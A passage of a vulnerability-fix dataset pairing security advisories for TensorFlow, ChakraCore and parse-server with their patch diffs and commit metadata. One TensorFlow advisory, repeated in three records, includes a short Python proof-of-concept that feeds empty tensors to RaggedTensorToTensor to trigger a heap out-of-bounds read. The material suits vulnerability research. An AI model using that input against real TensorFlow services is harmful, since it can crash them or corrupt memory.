2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-11-10","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/67bfd9feeecfb3c61d80f0e46d89c170fbee682b","commit_sha":"67bfd9feeecfb3c61d80f0e46d89c170fbee682b","patch":"SINGLE","chain_ord":"['67bfd9feeecfb3c61d80f0e46d89c170fbee682b']","before_first_fix_commit":"{'421fba8888bb8f8724bc2e35ca2fdcde16e1bfe5'}","last_fix_commit":"67bfd9feeecfb3c61d80f0e46d89c170fbee682b","chain_ord_pos":1.0,"commit_datetime":"09\/30\/2021, 17:44:33","message":"Make SparseFillEmptyRows validate that the length of `values` must be equal to the number of index tuples.\n\nPiperOrigin-RevId: 399969549\nChange-Id: I3c2f2ca1c1d2cc88bb5951c6958b38c16e9436c8","author":"Penporn Koanantakool","comments":null,"stats":"{'additions': 8, 'deletions': 0, 'total': 8}","files":"{'tensorflow\/core\/kernels\/sparse_fill_empty_rows_op.cc': {'additions': 8, 'deletions': 0, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/67bfd9feeecfb3c61d80f0e46d89c170fbee682b\/tensorflow%2Fcore%2Fkernels%2Fsparse_fill_empty_rows_op.cc', 'patch': '@@ -24,11 +24,13 @@ limitations under the License.\\n #include <vector>\\n \\n #include \"tensorflow\/core\/framework\/op_kernel.h\"\\n+#include \"tensorflow\/core\/framework\/op_requires.h\"\\n #include \"tensorflow\/core\/framework\/register_types.h\"\\n #include \"tensorflow\/core\/framework\/tensor.h\"\\n #include \"tensorflow\/core\/framework\/tensor_util.h\"\\n #include \"tensorflow\/core\/framework\/types.h\"\\n #include \"tensorflow\/core\/lib\/gtl\/inlined_vector.h\"\\n+#include \"tensorflow\/core\/platform\/errors.h\"\\n #include \"tensorflow\/core\/util\/sparse\/sparse_tensor.h\"\\n \\n namespace tensorflow {\\n@@ -222,6 +224,12 @@ void SparseFillEmptyRowsOpImpl(OpKernelContext* context,\\n                     errors::InvalidArgument(\"values must be a vector, saw: \",\\n                                             values_t.shape().DebugString()),\\n                     done);\\n+  OP_REQUIRES_ASYNC(\\n+      context, indices_t.dim_size(0) == values_t.dim_size(0),\\n+      errors::InvalidArgument(\"The length of `values` (\", values_t.dim_size(0),\\n+                              \") must match the first dimension of `indices` (\",\\n+                              indices_t.dim_size(0), \").\"),\\n+      done);\\n   OP_REQUIRES_ASYNC(\\n       context, TensorShapeUtils::IsScalar(default_value_t.shape()),\\n       errors::InvalidArgument(\"default_value must be a scalar, saw: \",'}}","message_norm":"make sparsefillemptyrows validate that the length of `values` must be equal to the number of index tuples.\n\npiperorigin-revid: 399969549\nchange-id: i3c2f2ca1c1d2cc88bb5951c6958b38c16e9436c8","language":"en","entities":"[('validate', 'ACTION', ''), ('399969549', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_fill_empty_rows_op.cc'])","num_files":1.0},{"index":2944,"vuln_id":"GHSA-rgvq-pcvf-hx75","cwe_id":"{'CWE-131'}","score":5.3,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f94ef358bb3e91d517446454edff6535bcfe8e4a', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c4d7afb6a5986b04505aca4466ae1951686c80f6', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b761c9b652af2107cfbc33efd19be0ce41daa33e'}","dataset":"osv","summary":"Heap OOB and null pointer dereference in `RaggedTensorToTensor` ### Impact\nDue to lack of validation in `tf.raw_ops.RaggedTensorToTensor`, an attacker can exploit an undefined behavior if input arguments are empty:\n\n```python\nimport tensorflow as tf\n\nshape = tf.constant([-1, -1], shape=[2], dtype=tf.int64)\nvalues = tf.constant([], shape=[0], dtype=tf.int64)\ndefault_value = tf.constant(404, dtype=tf.int64)\nrow = tf.constant([269, 404, 0, 0, 0, 0, 0], shape=[7], dtype=tf.int64)\nrows = [row]\ntypes = ['ROW_SPLITS']\n\ntf.raw_ops.RaggedTensorToTensor(\n  shape=shape, values=values, default_value=default_value, \n  row_partition_tensors=rows, row_partition_types=types)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/656e7673b14acd7835dc778867f84916c6d1cac2\/tensorflow\/core\/kernels\/ragged_tensor_to_tensor_op.cc#L356-L360) only checks that one of the tensors is not empty, but does not check for the other ones.\n\nThere are multiple `DCHECK` validations to prevent heap OOB, but these are no-op in release builds, hence they don't prevent anything.\n\n### Patches\nWe have patched the issue in GitHub commit [b761c9b652af2107cfbc33efd19be0ce41daa33e](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b761c9b652af2107cfbc33efd19be0ce41daa33e) followed by GitHub commit [f94ef358bb3e91d517446454edff6535bcfe8e4a](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f94ef358bb3e91d517446454edff6535bcfe8e4a) and GitHub commit [c4d7afb6a5986b04505aca4466ae1951686c80f6](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c4d7afb6a5986b04505aca4466ae1951686c80f6).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick these commits on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":3,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f94ef358bb3e91d517446454edff6535bcfe8e4a","commit_sha":"f94ef358bb3e91d517446454edff6535bcfe8e4a","patch":"MULTI","chain_ord":"['f94ef358bb3e91d517446454edff6535bcfe8e4a', 'b761c9b652af2107cfbc33efd19be0ce41daa33e', 'c4d7afb6a5986b04505aca4466ae1951686c80f6']","before_first_fix_commit":"{'50034ad2d55b10eb9d4593374546710b12f134e1'}","last_fix_commit":"c4d7afb6a5986b04505aca4466ae1951686c80f6","chain_ord_pos":1.0,"commit_datetime":"04\/13\/2021, 21:54:18","message":"Fix `tf.raw_ops.RaggedTensorToTensor` failing CHECK in `tensor.cc`.\n\nPiperOrigin-RevId: 368300502\nChange-Id: I91255d23c4bfd3aa3c029aac773937c09daf3c64","author":"Amit Patankar","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'tensorflow\/core\/kernels\/ragged_tensor_to_tensor_op.cc': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/f94ef358bb3e91d517446454edff6535bcfe8e4a\/tensorflow%2Fcore%2Fkernels%2Fragged_tensor_to_tensor_op.cc', 'patch': '@@ -345,6 +345,11 @@ class RaggedTensorToTensorBaseOp : public OpKernel {\\n \\n   void Compute(OpKernelContext* context) override {\\n     INDEX_TYPE first_dimension;\\n+    const Tensor first_partition_tensor =\\n+        context->input(kFirstPartitionInputIndex);\\n+    OP_REQUIRES(context, first_partition_tensor.NumElements() > 0,\\n+                errors::InvalidArgument(\"Invalid first partition input. Tensor \"\\n+                                        \"requires at least one element.\"));\\n     OP_REQUIRES_OK(context, GetFirstDimensionSize(context, &first_dimension));\\n     vector<INDEX_TYPE> output_size;\\n     OP_REQUIRES_OK(context,'}}","message_norm":"fix `tf.raw_ops.raggedtensortotensor` failing check in `tensor.cc`.\n\npiperorigin-revid: 368300502\nchange-id: i91255d23c4bfd3aa3c029aac773937c09daf3c64","language":"en","entities":"[('fix', 'ACTION', ''), ('368300502', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/ragged_tensor_to_tensor_op.cc'])","num_files":1.0},{"index":2945,"vuln_id":"GHSA-rgvq-pcvf-hx75","cwe_id":"{'CWE-131'}","score":5.3,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f94ef358bb3e91d517446454edff6535bcfe8e4a', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c4d7afb6a5986b04505aca4466ae1951686c80f6', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b761c9b652af2107cfbc33efd19be0ce41daa33e'}","dataset":"osv","summary":"Heap OOB and null pointer dereference in `RaggedTensorToTensor` ### Impact\nDue to lack of validation in `tf.raw_ops.RaggedTensorToTensor`, an attacker can exploit an undefined behavior if input arguments are empty:\n\n```python\nimport tensorflow as tf\n\nshape = tf.constant([-1, -1], shape=[2], dtype=tf.int64)\nvalues = tf.constant([], shape=[0], dtype=tf.int64)\ndefault_value = tf.constant(404, dtype=tf.int64)\nrow = tf.constant([269, 404, 0, 0, 0, 0, 0], shape=[7], dtype=tf.int64)\nrows = [row]\ntypes = ['ROW_SPLITS']\n\ntf.raw_ops.RaggedTensorToTensor(\n  shape=shape, values=values, default_value=default_value, \n  row_partition_tensors=rows, row_partition_types=types)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/656e7673b14acd7835dc778867f84916c6d1cac2\/tensorflow\/core\/kernels\/ragged_tensor_to_tensor_op.cc#L356-L360) only checks that one of the tensors is not empty, but does not check for the other ones.\n\nThere are multiple `DCHECK` validations to prevent heap OOB, but these are no-op in release builds, hence they don't prevent anything.\n\n### Patches\nWe have patched the issue in GitHub commit [b761c9b652af2107cfbc33efd19be0ce41daa33e](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b761c9b652af2107cfbc33efd19be0ce41daa33e) followed by GitHub commit [f94ef358bb3e91d517446454edff6535bcfe8e4a](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f94ef358bb3e91d517446454edff6535bcfe8e4a) and GitHub commit [c4d7afb6a5986b04505aca4466ae1951686c80f6](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c4d7afb6a5986b04505aca4466ae1951686c80f6).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick these commits on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":3,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c4d7afb6a5986b04505aca4466ae1951686c80f6","commit_sha":"c4d7afb6a5986b04505aca4466ae1951686c80f6","patch":"MULTI","chain_ord":"['f94ef358bb3e91d517446454edff6535bcfe8e4a', 'b761c9b652af2107cfbc33efd19be0ce41daa33e', 'c4d7afb6a5986b04505aca4466ae1951686c80f6']","before_first_fix_commit":"{'50034ad2d55b10eb9d4593374546710b12f134e1'}","last_fix_commit":"c4d7afb6a5986b04505aca4466ae1951686c80f6","chain_ord_pos":3.0,"commit_datetime":"05\/11\/2021, 22:22:49","message":"Fix heap OOB \/ undefined behavior in `RaggedTensorToTensor`\n\nPiperOrigin-RevId: 373244623\nChange-Id: I2d6cbbc8c67b238a8815bf58097f7586d87c54f2","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 35, 'deletions': 20, 'total': 55}","files":"{'tensorflow\/core\/kernels\/ragged_tensor_to_tensor_op.cc': {'additions': 35, 'deletions': 20, 'changes': 55, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/c4d7afb6a5986b04505aca4466ae1951686c80f6\/tensorflow%2Fcore%2Fkernels%2Fragged_tensor_to_tensor_op.cc', 'patch': '@@ -207,8 +207,8 @@ class RaggedTensorToTensorBaseOp : public OpKernel {\\n     DCHECK_EQ(result->size(), first_dimension);\\n   }\\n \\n-  void CalculateOutputIndexRowSplit(\\n-      OpKernelContext* context, const RowPartitionTensor& row_split,\\n+  Status CalculateOutputIndexRowSplit(\\n+      const RowPartitionTensor& row_split,\\n       const vector<INDEX_TYPE>& parent_output_index,\\n       INDEX_TYPE output_index_multiplier, INDEX_TYPE output_size,\\n       vector<INDEX_TYPE>* result) {\\n@@ -232,10 +232,11 @@ class RaggedTensorToTensorBaseOp : public OpKernel {\\n         result->push_back(-1);\\n       }\\n     }\\n-    if (row_split_size > 0) {\\n-      OP_REQUIRES(context, result->size() == row_split(row_split_size - 1),\\n-                  errors::InvalidArgument(\"Invalid row split size.\"));\\n+    if (row_split_size > 0 && result->size() != row_split(row_split_size - 1)) {\\n+      return errors::InvalidArgument(\"Invalid row split size.\");\\n     }\\n+\\n+    return Status::OK();\\n   }\\n \\n   \/\/ Calculate the output index of the first element of a list.\\n@@ -259,20 +260,26 @@ class RaggedTensorToTensorBaseOp : public OpKernel {\\n   \/\/ result[6] = -1 because parent_output_index[value_rowids[6]] == -1\\n   \/\/ result[7] = -1 because parent_output_index[value_rowids[6]] == -1\\n   \/\/ result[8] = parent_output_index[value_rowids[7]]\\n-  void CalculateOutputIndexValueRowID(\\n-      OpKernelContext* context, const RowPartitionTensor& value_rowids,\\n+  Status CalculateOutputIndexValueRowID(\\n+      const RowPartitionTensor& value_rowids,\\n       const vector<INDEX_TYPE>& parent_output_index,\\n       INDEX_TYPE output_index_multiplier, INDEX_TYPE output_size,\\n       vector<INDEX_TYPE>* result) {\\n     const INDEX_TYPE index_size = value_rowids.size();\\n     result->reserve(index_size);\\n     if (index_size == 0) {\\n-      return;\\n+      return Status::OK();\\n     }\\n \\n     INDEX_TYPE current_output_column = 0;\\n     INDEX_TYPE current_value_rowid = value_rowids(0);\\n-    DCHECK_LT(current_value_rowid, parent_output_index.size());\\n+\\n+    if (current_value_rowid >= parent_output_index.size()) {\\n+      return errors::InvalidArgument(\\n+          \"Got current_value_rowid=\", current_value_rowid,\\n+          \" which is not less than \", parent_output_index.size());\\n+    }\\n+\\n     INDEX_TYPE current_output_index = parent_output_index[current_value_rowid];\\n     result->push_back(current_output_index);\\n     for (INDEX_TYPE i = 1; i < index_size; ++i) {\\n@@ -289,13 +296,23 @@ class RaggedTensorToTensorBaseOp : public OpKernel {\\n       } else {\\n         current_output_column = 0;\\n         current_value_rowid = next_value_rowid;\\n-        DCHECK_LT(next_value_rowid, parent_output_index.size());\\n+\\n+        if (next_value_rowid >= parent_output_index.size()) {\\n+          return errors::InvalidArgument(\\n+              \"Got next_value_rowid=\", next_value_rowid,\\n+              \" which is not less than \", parent_output_index.size());\\n+        }\\n+\\n         current_output_index = parent_output_index[next_value_rowid];\\n       }\\n       result->push_back(current_output_index);\\n     }\\n-    OP_REQUIRES(context, result->size() == value_rowids.size(),\\n-                errors::InvalidArgument(\"Invalid row ids.\"));\\n+\\n+    if (result->size() != value_rowids.size()) {\\n+      return errors::InvalidArgument(\"Invalid row ids.\");\\n+    }\\n+\\n+    return Status::OK();\\n   }\\n \\n   Status CalculateOutputIndex(OpKernelContext* context, int dimension,\\n@@ -308,21 +325,19 @@ class RaggedTensorToTensorBaseOp : public OpKernel {\\n     auto partition_type = GetRowPartitionTypeByDimension(dimension);\\n     switch (partition_type) {\\n       case RowPartitionType::VALUE_ROWIDS:\\n-        CalculateOutputIndexValueRowID(\\n-            context, row_partition_tensor, parent_output_index,\\n-            output_index_multiplier, output_size, result);\\n-        return tensorflow::Status::OK();\\n+        return CalculateOutputIndexValueRowID(\\n+            row_partition_tensor, parent_output_index, output_index_multiplier,\\n+            output_size, result);\\n       case RowPartitionType::ROW_SPLITS:\\n         if (row_partition_tensor.size() - 1 > parent_output_index.size()) {\\n           return errors::InvalidArgument(\\n               \"Row partition size is greater than output size: \",\\n               row_partition_tensor.size() - 1, \" > \",\\n               parent_output_index.size());\\n         }\\n-        CalculateOutputIndexRowSplit(\\n-            context, row_partition_tensor, parent_output_index,\\n-            output_index_multiplier, output_size, result);\\n-        return tensorflow::Status::OK();\\n+        return CalculateOutputIndexRowSplit(\\n+            row_partition_tensor, parent_output_index, output_index_multiplier,\\n+            output_size, result);\\n       default:\\n         return errors::InvalidArgument(\\n             \"Unsupported partition type:\",'}}","message_norm":"fix heap oob \/ undefined behavior in `raggedtensortotensor`\n\npiperorigin-revid: 373244623\nchange-id: i2d6cbbc8c67b238a8815bf58097f7586d87c54f2","language":"en","entities":"[('fix', 'ACTION', ''), ('heap oob', 'SECWORD', ''), ('373244623', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/ragged_tensor_to_tensor_op.cc'])","num_files":1.0},{"index":2946,"vuln_id":"GHSA-rgvq-pcvf-hx75","cwe_id":"{'CWE-131'}","score":5.3,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f94ef358bb3e91d517446454edff6535bcfe8e4a', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c4d7afb6a5986b04505aca4466ae1951686c80f6', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b761c9b652af2107cfbc33efd19be0ce41daa33e'}","dataset":"osv","summary":"Heap OOB and null pointer dereference in `RaggedTensorToTensor` ### Impact\nDue to lack of validation in `tf.raw_ops.RaggedTensorToTensor`, an attacker can exploit an undefined behavior if input arguments are empty:\n\n```python\nimport tensorflow as tf\n\nshape = tf.constant([-1, -1], shape=[2], dtype=tf.int64)\nvalues = tf.constant([], shape=[0], dtype=tf.int64)\ndefault_value = tf.constant(404, dtype=tf.int64)\nrow = tf.constant([269, 404, 0, 0, 0, 0, 0], shape=[7], dtype=tf.int64)\nrows = [row]\ntypes = ['ROW_SPLITS']\n\ntf.raw_ops.RaggedTensorToTensor(\n  shape=shape, values=values, default_value=default_value, \n  row_partition_tensors=rows, row_partition_types=types)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/656e7673b14acd7835dc778867f84916c6d1cac2\/tensorflow\/core\/kernels\/ragged_tensor_to_tensor_op.cc#L356-L360) only checks that one of the tensors is not empty, but does not check for the other ones.\n\nThere are multiple `DCHECK` validations to prevent heap OOB, but these are no-op in release builds, hence they don't prevent anything.\n\n### Patches\nWe have patched the issue in GitHub commit [b761c9b652af2107cfbc33efd19be0ce41daa33e](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b761c9b652af2107cfbc33efd19be0ce41daa33e) followed by GitHub commit [f94ef358bb3e91d517446454edff6535bcfe8e4a](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f94ef358bb3e91d517446454edff6535bcfe8e4a) and GitHub commit [c4d7afb6a5986b04505aca4466ae1951686c80f6](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c4d7afb6a5986b04505aca4466ae1951686c80f6).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick these commits on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":3,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b761c9b652af2107cfbc33efd19be0ce41daa33e","commit_sha":"b761c9b652af2107cfbc33efd19be0ce41daa33e","patch":"MULTI","chain_ord":"['f94ef358bb3e91d517446454edff6535bcfe8e4a', 'b761c9b652af2107cfbc33efd19be0ce41daa33e', 'c4d7afb6a5986b04505aca4466ae1951686c80f6']","before_first_fix_commit":"{'50034ad2d55b10eb9d4593374546710b12f134e1'}","last_fix_commit":"c4d7afb6a5986b04505aca4466ae1951686c80f6","chain_ord_pos":2.0,"commit_datetime":"04\/15\/2021, 20:28:49","message":"Fix `tf.raw_ops.RaggedTensorToTensor` failing CHECK.\n\nPiperOrigin-RevId: 368706628\nChange-Id: I5c9ea4833f38835ee183ca50d63251dc89c9f3bc","author":"Amit Patankar","comments":null,"stats":"{'additions': 11, 'deletions': 9, 'total': 20}","files":"{'tensorflow\/core\/kernels\/ragged_tensor_to_tensor_op.cc': {'additions': 11, 'deletions': 9, 'changes': 20, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/b761c9b652af2107cfbc33efd19be0ce41daa33e\/tensorflow%2Fcore%2Fkernels%2Fragged_tensor_to_tensor_op.cc', 'patch': '@@ -208,7 +208,7 @@ class RaggedTensorToTensorBaseOp : public OpKernel {\\n   }\\n \\n   void CalculateOutputIndexRowSplit(\\n-      const RowPartitionTensor& row_split,\\n+      OpKernelContext* context, const RowPartitionTensor& row_split,\\n       const vector<INDEX_TYPE>& parent_output_index,\\n       INDEX_TYPE output_index_multiplier, INDEX_TYPE output_size,\\n       vector<INDEX_TYPE>* result) {\\n@@ -233,7 +233,8 @@ class RaggedTensorToTensorBaseOp : public OpKernel {\\n       }\\n     }\\n     if (row_split_size > 0) {\\n-      DCHECK_EQ(result->size(), row_split(row_split_size - 1));\\n+      OP_REQUIRES(context, result->size() == row_split(row_split_size - 1),\\n+                  errors::InvalidArgument(\"Invalid row split size.\"));\\n     }\\n   }\\n \\n@@ -259,7 +260,7 @@ class RaggedTensorToTensorBaseOp : public OpKernel {\\n   \/\/ result[7] = -1 because parent_output_index[value_rowids[6]] == -1\\n   \/\/ result[8] = parent_output_index[value_rowids[7]]\\n   void CalculateOutputIndexValueRowID(\\n-      const RowPartitionTensor& value_rowids,\\n+      OpKernelContext* context, const RowPartitionTensor& value_rowids,\\n       const vector<INDEX_TYPE>& parent_output_index,\\n       INDEX_TYPE output_index_multiplier, INDEX_TYPE output_size,\\n       vector<INDEX_TYPE>* result) {\\n@@ -293,7 +294,8 @@ class RaggedTensorToTensorBaseOp : public OpKernel {\\n       }\\n       result->push_back(current_output_index);\\n     }\\n-    DCHECK_EQ(result->size(), value_rowids.size());\\n+    OP_REQUIRES(context, result->size() == value_rowids.size(),\\n+                errors::InvalidArgument(\"Invalid row ids.\"));\\n   }\\n \\n   Status CalculateOutputIndex(OpKernelContext* context, int dimension,\\n@@ -307,13 +309,13 @@ class RaggedTensorToTensorBaseOp : public OpKernel {\\n     switch (partition_type) {\\n       case RowPartitionType::VALUE_ROWIDS:\\n         CalculateOutputIndexValueRowID(\\n-            row_partition_tensor, parent_output_index, output_index_multiplier,\\n-            output_size, result);\\n+            context, row_partition_tensor, parent_output_index,\\n+            output_index_multiplier, output_size, result);\\n         return tensorflow::Status::OK();\\n       case RowPartitionType::ROW_SPLITS:\\n-        CalculateOutputIndexRowSplit(row_partition_tensor, parent_output_index,\\n-                                     output_index_multiplier, output_size,\\n-                                     result);\\n+        CalculateOutputIndexRowSplit(\\n+            context, row_partition_tensor, parent_output_index,\\n+            output_index_multiplier, output_size, result);\\n         return tensorflow::Status::OK();\\n       default:\\n         return errors::InvalidArgument('}}","message_norm":"fix `tf.raw_ops.raggedtensortotensor` failing check.\n\npiperorigin-revid: 368706628\nchange-id: i5c9ea4833f38835ee183ca50d63251dc89c9f3bc","language":"en","entities":"[('fix', 'ACTION', ''), ('368706628', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/ragged_tensor_to_tensor_op.cc'])","num_files":1.0},{"index":2948,"vuln_id":"GHSA-rh4p-g7x6-8pqg","cwe_id":"{'CWE-787'}","score":7.5,"chain":"{'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/75162b7f2d8ac2b37d17564e9c979ba1bae707e8', 'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/7f0d390ad77d838cbb81d4586c83ec822f384ce8'}","dataset":"osv","summary":"Out-of-bounds write A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge, aka 'Chakra Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-1092, CVE-2019-1103, CVE-2019-1106, CVE-2019-1107.","published_date":"2021-03-29","chain_len":2,"project":"https:\/\/github.com\/chakra-core\/ChakraCore","commit_href":"https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/7f0d390ad77d838cbb81d4586c83ec822f384ce8","commit_sha":"7f0d390ad77d838cbb81d4586c83ec822f384ce8","patch":"MULTI","chain_ord":"['7f0d390ad77d838cbb81d4586c83ec822f384ce8', '75162b7f2d8ac2b37d17564e9c979ba1bae707e8']","before_first_fix_commit":"{'12c31f0e83ddc511e57b9aa1e78533899199eb32', 'ba1f4455f921ce5f12091ff8a11c8028c6a64b17'}","last_fix_commit":"75162b7f2d8ac2b37d17564e9c979ba1bae707e8","chain_ord_pos":1.0,"commit_datetime":"06\/06\/2019, 18:38:26","message":"[CVE-2019-1062] Chakra JIT Type Confusion","author":"Paul Leathers","comments":null,"stats":"{'additions': 5, 'deletions': 6, 'total': 11}","files":"{'lib\/Backend\/Opnd.cpp': {'additions': 5, 'deletions': 6, 'changes': 11, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/chakra-core\/ChakraCore\/raw\/7f0d390ad77d838cbb81d4586c83ec822f384ce8\/lib%2FBackend%2FOpnd.cpp', 'patch': \"@@ -962,7 +962,8 @@ PropertySymOpnd::IsObjectHeaderInlined() const\\n bool\\n PropertySymOpnd::ChangesObjectLayout() const\\n {\\n-    JITTypeHolder cachedType = this->IsMono() ? this->GetType() : this->GetFirstEquivalentType();\\n+    JITTypeHolder cachedType = this->HasInitialType() ? this->GetInitialType() : \\n+        this->IsMono() ? this->GetType() : this->GetFirstEquivalentType();\\n \\n     JITTypeHolder finalType = this->GetFinalType();\\n \\n@@ -987,13 +988,11 @@ PropertySymOpnd::ChangesObjectLayout() const\\n         \/\/ This is the case where the type transition actually occurs. (This is the only case that's detectable\\n         \/\/ during the loop pre-pass, since final types are not in place yet.)\\n \\n-        Assert(cachedType != nullptr && Js::DynamicType::Is(cachedType->GetTypeId()));\\n-\\n-        const JITTypeHandler * cachedTypeHandler = cachedType->GetTypeHandler();\\n         const JITTypeHandler * initialTypeHandler = initialType->GetTypeHandler();\\n \\n-        return cachedTypeHandler->GetInlineSlotCapacity() != initialTypeHandler->GetInlineSlotCapacity() ||\\n-            cachedTypeHandler->GetOffsetOfInlineSlots() != initialTypeHandler->GetOffsetOfInlineSlots();\\n+        \/\/ If no final type has been set in the forward pass, then we have no way of knowing how the object shape will evolve here.\\n+        \/\/ If the initial type is object-header-inlined, assume that the layout may change.\\n+        return initialTypeHandler->IsObjectHeaderInlinedTypeHandler();\\n     }\\n \\n     return false;\"}}","message_norm":"[cve-2019-1062] chakra jit type confusion","language":"en","entities":"[('cve-2019-1062', 'VULNID', 'CVE'), ('type confusion', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/Backend\/Opnd.cpp'])","num_files":1.0},{"index":2950,"vuln_id":"GHSA-rh9j-f5f8-rvgc","cwe_id":"{'CWE-295', 'CWE-287'}","score":8.6,"chain":"{'https:\/\/github.com\/parse-community\/parse-server\/commit\/ba2b0a9cb9a568817a114b132a4c2e0911d76df1', 'https:\/\/github.com\/parse-community\/parse-server\/pull\/8054\/commits\/0cc299f82e367518f2fe7a53b99f3f801a338cf4', 'https:\/\/github.com\/parse-community\/parse-server\/pull\/8054\/commits\/2084b7c569697a5230e42511799eeac9219db5a9'}","dataset":"osv","summary":"Authentication bypass vulnerability in Apple Game Center auth adapter  ### Impact\nThe certificate in Apple Game Center auth adapter not validated. As a result, authentication could potentially be bypassed by making a fake certificate accessible via certain Apple domains and providing the URL to that certificate in an authData object.\n\n### Patches\nTo prevent this, a new `rootCertificateUrl` property is introduced to the Parse Server Apple Game Center auth adapter which takes the URL to the root certificate of Apple's Game Center authentication certificate. If no value is set, the `rootCertificateUrl` property defaults to the URL of the [current root certificate](https:\/\/developer.apple.com\/news\/?id=stttq465) as of May 27, 2022.\n\nKeep in mind that the root certificate can change at any time (expected to be announced by Apple) and that it is the developer's responsibility to keep the root certificate URL up-to-date when using the Parse Server Apple Game Center auth adapter.\n\n### Workarounds\nNone.\n\n### References\n- https:\/\/github.com\/parse-community\/parse-server\/security\/advisories\/GHSA-rh9j-f5f8-rvgc\n- https:\/\/developer.apple.com\/news\/?id=stttq465\n- https:\/\/github.com\/parse-community\/parse-server\n\n### More information\n* For questions or comments about this vulnerability visit our [community forum](http:\/\/community.parseplatform.org) or [community chat](http:\/\/chat.parseplatform.org)\n* Report other vulnerabilities at [report.parseplatform.org](https:\/\/report.parseplatform.org)","published_date":"2022-06-17","chain_len":3,"project":"https:\/\/github.com\/parse-community\/parse-server","commit_href":"https:\/\/github.com\/parse-community\/parse-server\/pull\/8054\/commits\/0cc299f82e367518f2fe7a53b99f3f801a338cf4","commit_sha":"0cc299f82e367518f2fe7a53b99f3f801a338cf4","patch":"MULTI","chain_ord":"['2084b7c569697a5230e42511799eeac9219db5a9', '0cc299f82e367518f2fe7a53b99f3f801a338cf4', 